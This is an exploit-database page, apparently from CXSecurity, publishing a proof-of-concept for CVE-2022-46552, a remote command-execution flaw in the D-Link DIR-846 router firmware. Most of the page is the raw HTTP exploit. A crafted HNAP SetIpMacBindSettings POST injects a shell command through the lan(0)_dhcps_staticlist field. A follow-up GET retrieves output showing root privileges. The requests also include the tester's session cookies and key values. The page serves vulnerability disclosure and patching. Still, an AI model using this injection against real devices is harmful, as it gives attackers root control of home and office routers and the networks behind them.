---
title: D-Link DIR-846 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2023040021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-06
fetch_date: 2025-10-04T11:30:03.969233
---

# D-Link DIR-846 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **D-Link DIR-846 Remote Command Execution** **2023.04.05**  Credit:  **[Francoa Taffarel](https://cxsecurity.com/author/Francoa%2BTaffarel/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-46552](https://cxsecurity.com/cveshow/CVE-2022-46552/ "Click to see CVE-2022-46552")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: D-Link DIR-846 - Remote Command Execution (RCE) vulnerability
# Google Dork: NA
# Date: 30/01/2023
# Exploit Author: Françoa Taffarel
# Vendor Homepage:
https://www.dlink.com.br/produto/roteador-dir-846-gigabit-wi-fi-ac1200/#suportehttps://www.dlink.com.br/wp-content/uploads/2020/02/DIR846enFW100A53DBR-Retail.zip
# Software Link:
https://www.dlink.com.br/wp-content/uploads/2020/02/DIR846enFW100A53DBR-Retail.zip
# Version: DIR846enFW100A53DBR-Retail
# Tested on: D-LINK DIR-846
# CVE : CVE-2022-46552
D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote
command execution (RCE) vulnerability via the lan(0)\_dhcps\_staticlist
parameter. This vulnerability is exploited via a crafted POST request.
### Malicious POST Request
```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:107.0) Gecko/20100101
Firefox/107.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetIpMacBindSettings"
HNAP\_AUTH: 0107E0F97B1ED75C649A875212467F1E 1669853009285
Content-Length: 171
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/AdvMacBindIp.html?t=1669852917775
Cookie: PHPSESSID=133b3942febf51641c4bf0d81548ac78; uid=idh0QaG7;
PrivateKey=DBA9B02F550ECD20E7D754A131BE13DF; timeout=4
{"SetIpMacBindSettings":{"lan\_unit":"0","lan(0)\_dhcps\_staticlist":"1,$(id>rce\_confirmed),02:42:d6:f9:dc:4e,192.168.0.15"}}
```
### Response
```
HTTP/1.1 200 OK
X-Powered-By: PHP/7.1.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8
Connection: close
Date: Thu, 01 Dec 2022 11:03:54 GMT
Server: lighttpd/1.4.35
Content-Length: 68
{"SetIpMacBindSettingsResponse":{"SetIpMacBindSettingsResult":"OK"}}
```
### Data from RCE Request
```
GET /HNAP1/rce\_confirmed HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:107.0) Gecko/20100101
Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=133b3942febf51641c4bf0d81548ac78; uid=ljZlHjKV;
PrivateKey=846232FD25AA8BEC8550EF6466B168D9; timeout=1
Upgrade-Insecure-Requests: 1
```
### Response
```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: bytes
Content-Length: 24
Connection: close
Date: Thu, 01 Dec 2022 23:24:28 GMT
Server: lighttpd/1.4.35
uid=0(root) gid=0(root)
```

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040021)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top